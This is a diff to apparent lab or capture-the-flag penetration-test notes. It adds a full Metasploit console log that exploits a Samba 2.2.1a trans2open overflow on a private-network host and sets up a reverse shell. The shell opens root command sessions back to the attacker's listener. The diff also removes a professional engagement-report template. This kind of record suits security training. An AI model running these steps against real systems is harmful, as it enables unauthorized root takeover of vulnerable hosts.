@@ -4,7 +4,7 @@
 
 ### TL;DR
 
-Initial: `how in`. PrivEsc: `how root`.
+Initial: `exploit/linux/samba/trans2open -> linux/x86/shell_reverse_tcp` . PrivEsc: same as *Initial*.
 
 *Impact Overview*:
 - RCE / data exfil / persistence / etc.
@@ -41,7 +41,7 @@ Initial: `how in`. PrivEsc: `how root`.
             - Less valuable than `mod_ssl` because remote shell is high value, but remote DoS and code exec is lower value in potential pivot, scope, and opsec risk
         - *Port 443*
         - *Port 139/443* - `Unix (Samba 2.2.1a)`
-            - Potential vulnerable to Metasploit module `trans2open`
+            - **CONFIRMED** vulnerable to Metasploit module `trans2open` => yields `root`
 4. *PrivEsc/Persistence*:
 5. *Proof — path to flags/screenshot of boxpwn*:
 
@@ -64,35 +64,7 @@ Initial: `how in`. PrivEsc: `how root`.
 
 `arp-scan -l` - list all mac addresses on this network
 `nikto -h` - IPADDR
-## if pro:
 
-- **Client / Eng:** `ClientName` — `ENG-####`
-
-- **Scope / Auth:** allowed targets, auth proof (attach signed scope file)
-
-- **Severity / CVSS:** `High/Medium/Low` — `CVSS: x.x`
-
-- **Impact (one line):** what it allows attacker to do (data exfil / RCE / lateral)
-
-- **Repro (minimal, exact):**
-    
-    1. Step 1 — exact command / URL / headers
-    2. Step 2 — exact command / cookie / timing        
-    3. Step 3 — minimal output proving the issue
-    
-- **Non-destructive PoC:** single deterministic check showing the issue (no persistent changes)
-
-- **Remediation (quick + long):** 1-line immediate mitigation; 1-line permanent fix + reference (CWE/CVE)
-
-- **Evidence (files + timestamps):** `pcap-YYYYMMDD.pcap`, `screenshot-1.png` — note redactions
-
-- **Cleanup (actions + timestamps):** files removed / creds rotated / services reverted
-
-- **Disclosure timeline:** private disclosure date — full/public disclosure date
-
-- **Hours / Billing:** total hrs — breakdown by recon/exploit/reporting
-
-- **Reporter contact / ticket:** name, email, ticket ID
 
 ## Scratchpad
 
@@ -317,5 +289,227 @@ Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
 + End Time:           2025-10-02 00:33:17 (GMT-4) (20 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
+
+```
+
+
+### Autopayload (metasploit root)
+```bash
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > search trans2open
+
+Matching Modules
+================
+
+   #  Name                                                         Disclosure Date  Rank   Check  Description
+   -  ----                                                         ---------------  ----   -----  -----------
+   0  exploit/freebsd/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
+   1  exploit/linux/samba/trans2open                               2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
+   2  exploit/osx/samba/trans2open                                 2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
+   3  exploit/solaris/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
+   4    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .      .      .
+   5    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .      .      .
+
+
+Interact with a module by name or index. For example info 5, use 5 or use exploit/solaris/samba/trans2open
+After interacting with a module you can manually set a TARGET with set TARGET 'Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce'                                                                                                                
+
+msf > use 1
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf exploit(linux/samba/trans2open) > options
+
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
+                                      s/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.109.128  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(linux/samba/trans2open) > set rhosts 192.168.109.129
+rhosts => 192.168.109.129
+msf exploit(linux/samba/trans2open) > options
+
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.109.129  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
+                                      s/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.109.128  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(linux/samba/trans2open) > show targets
+
+Exploit targets:
+=================
+
+    Id  Name
+    --  ----
+=>  0   Samba 2.2.x - Bruteforce
+
+
+msf exploit(linux/samba/trans2open) > run
+[*] Started reverse TCP handler on 192.168.109.128:4444 
+[*] 192.168.109.129:139 - Trying return address 0xbffffdfc...
+[*] 192.168.109.129:139 - Trying return address 0xbffffcfc...
+[*] 192.168.109.129:139 - Trying return address 0xbffffbfc...
+[*] 192.168.109.129:139 - Trying return address 0xbffffafc...
+[*] Sending stage (1062760 bytes) to 192.168.109.129
+[*] 192.168.109.129 - Meterpreter session 1 closed.  Reason: Died
+[*] 192.168.109.129:139 - Trying return address 0xbffff9fc...
+[*] Sending stage (1062760 bytes) to 192.168.109.129
+[*] 192.168.109.129 - Meterpreter session 2 closed.  Reason: Died
+[*] 192.168.109.129:139 - Trying return address 0xbffff8fc...
+[*] Sending stage (1062760 bytes) to 192.168.109.129
+[*] 192.168.109.129 - Meterpreter session 3 closed.  Reason: Died
+[*] 192.168.109.129:139 - Trying return address 0xbffff7fc...
+[*] Sending stage (1062760 bytes) to 192.168.109.129
+[*] 192.168.109.129 - Meterpreter session 4 closed.  Reason: Died
+[*] 192.168.109.129:139 - Trying return address 0xbffff6fc...
+[*] 192.168.109.129:139 - Trying return address 0xbffff5fc...
+[*] 192.168.109.129:139 - Trying return address 0xbffff4fc...
+^C[-] 192.168.109.129:139 - Exploit failed [user-interrupt]: Interrupt 
+[-] run: Interrupted
+msf exploit(linux/samba/trans2open) > 
+[-] Meterpreter session 1 is not valid and will be closed
+[-] Meterpreter session 2 is not valid and will be closed
+[-] Meterpreter session 3 is not valid and will be closed
+[-] Meterpreter session 4 is not valid and will be closed
+options
+
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.109.129  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
+                                      s/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.109.128  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(linux/samba/trans2open) > set payload linux/x86/
+set payload linux/x86/adduser                         set payload linux/x86/shell/bind_ipv6_tcp
+set payload linux/x86/chmod                           set payload linux/x86/shell/bind_ipv6_tcp_uuid
+set payload linux/x86/exec                            set payload linux/x86/shell/bind_nonx_tcp
+set payload linux/x86/meterpreter/bind_ipv6_tcp       set payload linux/x86/shell/bind_tcp
+set payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  set payload linux/x86/shell/bind_tcp_uuid
+set payload linux/x86/meterpreter/bind_nonx_tcp       set payload linux/x86/shell/reverse_ipv6_tcp
+set payload linux/x86/meterpreter/bind_tcp            set payload linux/x86/shell/reverse_nonx_tcp
+set payload linux/x86/meterpreter/bind_tcp_uuid       set payload linux/x86/shell/reverse_tcp
+set payload linux/x86/meterpreter/reverse_ipv6_tcp    set payload linux/x86/shell/reverse_tcp_uuid
+set payload linux/x86/meterpreter/reverse_nonx_tcp    set payload linux/x86/shell_bind_ipv6_tcp
+set payload linux/x86/meterpreter/reverse_tcp         set payload linux/x86/shell_bind_tcp
+set payload linux/x86/meterpreter/reverse_tcp_uuid    set payload linux/x86/shell_bind_tcp_random_port
+set payload linux/x86/metsvc_bind_tcp                 set payload linux/x86/shell_reverse_tcp
+set payload linux/x86/metsvc_reverse_tcp              set payload linux/x86/shell_reverse_tcp_ipv6
+set payload linux/x86/read_file                       
+msf exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
+payload => linux/x86/shell_reverse_tcp
+msf exploit(linux/samba/trans2open) > options
+
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.109.129  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basic
+                                      s/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (linux/x86/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   CMD    /bin/sh          yes       The command string to execute
+   LHOST  192.168.109.128  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(linux/samba/trans2open) > run
+[*] Started reverse TCP handler on 192.168.109.128:4444 
+[*] 192.168.109.129:139 - Trying return address 0xbffffdfc...
+[*] 192.168.109.129:139 - Trying return address 0xbffffcfc...
+[*] 192.168.109.129:139 - Trying return address 0xbffffbfc...
+[*] 192.168.109.129:139 - Trying return address 0xbffffafc...
+[*] 192.168.109.129:139 - Trying return address 0xbffff9fc...
+[*] 192.168.109.129:139 - Trying return address 0xbffff8fc...
+[*] 192.168.109.129:139 - Trying return address 0xbffff7fc...
+[*] 192.168.109.129:139 - Trying return address 0xbffff6fc...
+[*] Command shell session 5 opened (192.168.109.128:4444 -> 192.168.109.129:32773) at 2025-10-11 18:02:08 -0400
+
+[*] Command shell session 6 opened (192.168.109.128:4444 -> 192.168.109.129:32774) at 2025-10-11 18:02:09 -0400
+wh[*] Command shell session 7 opened (192.168.109.128:4444 -> 192.168.109.129:32775) at 2025-10-11 18:02:11 -0400
+oami[*] Command shell session 8 opened (192.168.109.128:4444 -> 192.168.109.129:32776) at 2025-10-11 18:02:12 -0400
+whoami 
+//bin/sh: whowhoami: command not found
+whoami
+root
 
 ```
